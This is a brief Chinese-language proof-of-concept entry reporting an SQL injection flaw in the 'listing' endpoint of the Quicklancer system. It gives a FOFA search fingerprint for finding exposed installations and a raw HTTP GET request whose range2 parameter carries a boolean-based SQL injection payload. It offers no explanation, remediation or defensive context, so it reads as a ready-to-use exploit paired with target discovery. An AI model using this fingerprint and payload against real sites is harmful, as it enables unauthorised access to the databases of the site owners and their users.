# Quicklancer系统接口listing存在SQL注入漏洞



## fofa

```java
"service_fragments/css/gig_detail.css"
```

## poc

```java
GET /listing?cat=6&filter=1&job-type=1&keywords=Mr.&location=1&order=desc&placeid=US&placetype=country&range1=1&range2=1) AND 6477=6477 AND (1232=1232&salary-type=1&sort=id&subcat= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
```

![image-20240730213839364](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407302138415.png)